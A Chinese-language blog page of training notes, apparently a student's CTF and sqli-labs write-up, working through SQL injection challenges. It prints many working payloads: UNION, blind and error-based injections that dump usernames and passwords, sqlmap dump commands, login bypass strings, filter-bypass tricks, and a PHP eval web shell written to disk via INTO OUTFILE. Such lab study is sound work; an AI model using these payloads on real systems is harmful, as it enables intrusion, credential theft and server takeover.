@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-Hans">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="soya的小屋" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    培训的那些日子day3 |  soya的小屋
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/%E5%85%B6%E4%BB%96%E7%BE%8E%E5%8C%96/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-培训day3"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  培训的那些日子day3
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/10/30/%E5%9F%B9%E8%AE%ADday3/" class="article-date">
+  <time datetime="2020-10-29T18:13:05.000Z" itemprop="datePublished">2020-10-30</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%9F%B9%E8%AE%AD%E8%AE%B0%E5%BD%95/">培训记录</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">11 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>pte的正式课程开始！</p>
+<p>实际上是day4的day3！</p>
+<p>今日学的是sql注入！（总感觉有些重复了趴……）</p>
+<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><p>这是一个比较出名的sql靶场（虽说如此我也就走过第一关-_-||）</p>
+<p>这次不全做，挑一部分。</p>
+<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>第一关，先重复遍流程。</p>
+<p><strong>1.判断是否存在注入点和注入类型</strong></p>
+<p><strong>2.判断字段长度</strong></p>
+<p><strong>3.判断字段的回显位置</strong></p>
+<p><strong>4.查找数据库名</strong></p>
+<p><strong>5.查找数据表名</strong></p>
+<p><strong>6.查找列名</strong></p>
+<p><strong>7.查看数据</strong></p>
+<p>好，一步步开始注入。</p>
+<span id="more"></span>
+<p>一开始尝试数字，发现不会有任何报错，尝试单引号后有报错。判断是字符型注入。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605628526888.png" alt="1605628526888"></p>
+<p>尝试– -和– +可闭合。</p>
+<p>测试and和or，发现可正常输出，没有被过滤。</p>
+<p>使用order by查询字段的长度，4的时候报错，判断有3个字段。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605628748554.png" alt="1605628748554"></p>
+<p>使用union查询字段回显位置。（切记id一定要是错误值，0或-1，这样才能把输出位置腾给下一个查询）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605629125440.png" alt="1605629125440"></p>
+<p>查询数据库名，得到security。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database()-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605629203968.png" alt="1605629203968"></p>
+<p>根据数据库名查询表名，获得了四个表emails,referers,uagents,users。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605629479333.png" alt="1605629479333"></p>
+<p>查看user表内的列。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605629576773.png" alt="1605629576773"></p>
+<p>选择想要查看的数据（username，password）,为了好看点我用了个|隔开了一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(username,&#x27;|&#x27;,password) from users -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605629712944.png" alt="1605629712944"></p>
+<p>成功！</p>
+<p>第一关没有任何过滤，还是很简单的。</p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>第二关和第一关差别不大，就是数字型注入，把单引号去掉就行。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605630023388.png" alt="1605630023388"></p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>根据报错可以看出，闭合又多了个括号。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605630170230.png" alt="1605630170230"></p>
+<p>加上闭合括号就好。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;|&#x27;,password) from users -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605630315607.png" alt="1605630315607"></p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>从报错中可以看出是双引号闭合的。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605777896235.png" alt="1605777896235"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username,&#x27;|&#x27;,password) from users -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605777963973.png" alt="1605777963973"></p>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>输入id=1，回显的是You are in……</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605778378741.png" alt="1605778378741"></p>
+<p>order by依然可以使用，但select没有回显。</p>
+<p>所以应该要使用盲注或者报错注入。</p>
+<p><strong>盲注的几步：</strong></p>
+<p><strong>1.猜测数据库</strong></p>
+<p><strong>2.猜测表</strong></p>
+<p><strong>3.猜测字段</strong></p>
+<p>一.猜测数据库</p>
+<p>猜长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1605779406872.png" alt="1605779406872"></p>
+<p>猜字母：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((database()),1) =&#x27;a&#x27; -- -  #数据库左边的第一个字母是否为a</span><br></pre></td></tr></table></figure>
+
+<p>*一个sql的语法：left()和right()。</p>
+<blockquote>
+<p> LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH) </p>
+<p>LEFT、RIGHT函数返回ARG最左边、右边的LENGTH个字符串，ARG可以是CHAR或BINARY STRING。   </p>
+</blockquote>
+<p>由于一个个实验太慢，所以使用bp进行爆破。得到第一个字母为s。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606326666916.png" alt="1606326666916"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((database()),2) =&#x27;sa&#x27; -- -  </span><br></pre></td></tr></table></figure>
+
+<p>一个个试下来，最后得到数据库名为：security。</p>
+<p>接下来猜表。</p>
+<p>猜测表的个数，有4个表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=4-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606328464692.png" alt="1606328464692"></p>
+<p>表的长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0--+</span><br></pre></td></tr></table></figure>
+
+<p>每个表的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),b,1)) &gt; n -- -</span><br></pre></td></tr></table></figure>
+
+<p><strong>a是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数</strong>。</p>
+<p>爆破结果，第一个表为emails，第二个为referers，第三个为uagents，第四个为users。</p>
+<p>爆破列和表查不多。</p>
+<blockquote>
+<p>依次确定表明：id=1’ and  ascii(substr((select table_name from information_schema.tables where  table_schema=database() limit 0,1),1,1))&gt;79–+</p>
+<p>确定列数：and (select count(column_name) from information_schema.columns  where table_schema=database() and table_name = ‘users’)&gt;0–+</p>
+<p>确定烈的长度：and length((select  column_name from  information_schema.columns where table_schema=database() and table_name =  ‘users’ limit 0,1)) &gt; 0–+</p>
+<p>依次确定列名：and ascii(substr((select column_name from  information_schema.columns where table_schema=database() and table_name =  ‘users’ limit 0,1),1,1)) &gt; 79 </p>
+<p>依次确定数据：and ascii(substr((select username from users limit 0,1),1,1))&gt;79</p>
+</blockquote>
+<p>基本思路是这样的，但实行起来着实特别麻烦。</p>
+<p>所以这题还是使用报错注入，盲注就用sqlmap来跑吧。</p>
+<p>数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606720275845.png" alt="1606720275845"></p>
+<p>查询表（只能一个个查）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select (table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),&#x27;~&#x27;),1)-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606720468167.png" alt="1606720468167"></p>
+<p>查询字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;~&#x27;),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p>查询内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select (username) from users limit 0,1),&#x27;~&#x27;),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606720831290.png" alt="1606720831290"></p>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>单引号变双引号，其他没有区别。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606720867531.png" alt="1606720867531"></p>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>输入id=1，回显use outfile。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606721144617.png" alt="1606721144617"></p>
+<p>这题要通过sql创建一个文件。</p>
+<p>所以创建一个一句话木马（不过首先要知道路径）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;)) union select 1,2,&#x27;&lt;? @eval($_POST[cmd]) ?&gt;&#x27; into outfile &#x27;G:\\phpstudy\\WWW\\sqli-labs-master\\1.php&#x27; -- -</span><br></pre></td></tr></table></figure>
+
+<p>虽然回显是报错，但实际上是创建成功的。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606722220885.png" alt="1606722220885"></p>
+<p>使用菜刀尝试连接，成功！</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606723564655.png" alt="1606723564655"></p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>布尔盲注题，正好学习一下sqlmap。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606723727958.png" alt="1606723727958"></p>
+<p><strong>判断注入点：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-8/?id=1 --batch</span><br></pre></td></tr></table></figure>
+
+<p>id为注入点，类型为布尔盲注或者时间盲注。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606740616661.png" alt="1606740616661"></p>
+<p><strong>判断当前数据库：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-8/?id=1 --current-db --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741113941.png" alt="1606741113941"></p>
+<p>判断当前表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-8/?id=1 -D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p>爆破出4个表。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741962908.png" alt="1606741962908"></p>
+<p><strong>判断字段：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-8/?id=1 -D security -T users --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p>三个。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606743247072.png" alt="1606743247072"></p>
+<p><strong>内容：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-8/?id=1 -D security -T users -C &quot;id,password,username&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606972097097.png" alt="1606972097097"></p>
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606737586896.png" alt="1606737586896"></p>
+<p>两个输入框，我一下子想到了万能密码（’or ‘1’ =’1’#)。</p>
+<p>试一下。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606737846048.png" alt="1606737846048"></p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606737874060.png" alt="1606737874060"></p>
+<p>试了下admin什么的都可以成功。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606737931110.png" alt="1606737931110"></p>
+<p>抓包一下，查看提交的数据。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606738502706.png" alt="1606738502706"></p>
+<p>修改uname来试验是否会有正常回显。</p>
+<p>admin’ and 1=1 – -正常登陆。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606738882656.png" alt="1606738882656"></p>
+<p>admin’ and 1=2– -报错。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606738814746.png" alt="1606738814746"></p>
+<p>判断有报错注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and extractvalue(1,concat(0x7e,(select database())))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606739010083.png" alt="1606739010083"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606739229497.png" alt="1606739229497"></p>
+<p>用这样的方法爆出更多的信息。</p>
+<h1 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h1><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741292499.png" alt="1606741292499"></p>
+<p>先测试回显是否正常，是否有被过滤的。</p>
+<p>结果是无过滤。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741447940.png" alt="1606741447940"></p>
+<p>还是老样子。</p>
+<p>order by判断字段数为4.</p>
+<p>再用select查看每个字段的回显位置。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741557716.png" alt="1606741557716"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：&#x27; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741606302.png" alt="1606741606302"></p>
+<p>其他的也是老样子查询。</p>
+<p>最后获得flag。（由于没有过滤，非常简单）</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606741877904.png" alt="1606741877904"></p>
+<h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><p>简单过滤的题。</p>
+<p>首先进入题目是一个页面，先查找注入点。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606742143301.png" alt="1606742143301"></p>
+<p>点击list界面，发现了注入点（id）</p>
+<p>使用fuzz测试，查看哪些被过滤。</p>
+<p>最后发现and，or，select，union被过滤，不过双写可以绕过。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606742387208.png" alt="1606742387208"></p>
+<p>后面除了要双写绕过外，其他没太大区别。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606742665029.png" alt="1606742665029"></p>
+<p>查询数据库。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606742691330.png" alt="1606742691330"></p>
+<p>数据表（小心information的or要双写）。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606742887539.png" alt="1606742887539"></p>
+<p>列。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606742962258.png" alt="1606742962258"></p>
+<p>拿到flag。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606743016115.png" alt="1606743016115"></p>
+<h1 id="sql-gbk-宽字节"><a href="#sql-gbk-宽字节" class="headerlink" title="sql-gbk(宽字节)"></a>sql-gbk(宽字节)</h1><p>这个题会把sql语句回显在页面上。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606743473150.png" alt="1606743473150"></p>
+<p>试了下发现单引号和双引号都被过滤了。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606743771595.png" alt="1606743771595"></p>
+<p>尝试使用宽字节（%df）。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606744388759.png" alt="1606744388759"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
+
+<p>3报错，判断为2列。</p>
+<p>其他也是差不多的。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606744672848.png" alt="1606744672848"></p>
+<p>database：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606744697053.png" alt="1606744697053"></p>
+<p>table：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606744829405.png" alt="1606744829405"></p>
+<p>column（table记得转为16进制）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df%27%20union%20%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x63746634%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606744940145.png" alt="1606744940145"></p>
+<p>flag：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606745083145.png" alt="1606745083145"></p>
+<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h2><p>登陆框……</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606745345678.png" alt="1606745345678"></p>
+<p>万能密码(‘or 1=1#)直接进入拿到flag……</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606745387407.png" alt="1606745387407"></p>
+<h2 id="LoveSql"><a href="#LoveSql" class="headerlink" title="LoveSql"></a>LoveSql</h2><p>以为会变难，试了下万能密码又进去了？</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606746057577.png" alt="1606746057577"></p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606746026861.png" alt="1606746026861"></p>
+<p>用户为admin，密码是一串密文56fce8f5a0b7b9fa254f7c9df1821ef1。</p>
+<p>但我要找的是flag，而不是密码。</p>
+<p>尝试使用admin’ and 1=1和admin’ and 1=2的回显来判断。</p>
+<p>结果admin’ and 1=1回显正常。</p>
+<p>而1=2报错。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606746639818.png" alt="1606746639818"></p>
+<p>尝试使用报错注入，查找数据库信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,(select database())))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606746821585.png" alt="1606746821585"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=&#x27;geek&#x27; limit 0,1)))-- -</span><br></pre></td></tr></table></figure>
+
+<p>查询到了数据表geekuser和l0ve1ysq1。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606752365574.png" alt="1606752365574"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 1,1)))-- -</span><br><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; limit 2,1)))-- -</span><br></pre></td></tr></table></figure>
+
+<p>查看每个表里的每个列名。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606752831159.png" alt="1606752831159"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,(select concat(id,username,password) from geekuser)))-- -</span><br></pre></td></tr></table></figure>
+
+<p>查看geekuser的字段内容，回显正常。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606752760252.png" alt="1606752760252"></p>
+<p>查看l0ve1ysq1，报错。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606752942877.png" alt="1606752942877"></p>
+<p>不能一起看就一个个看吧……</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,(select concat(id,username,password) from l0ve1ysq1 limit 0,1)))-- -</span><br></pre></td></tr></table></figure>
+
+<p>看第一个内容（1cl4ywo_tai_nan_le）。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606752980472.png" alt="1606752980472"></p>
+<p>第二个：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606753048705.png" alt="1606753048705"></p>
+<p>第三个</p>
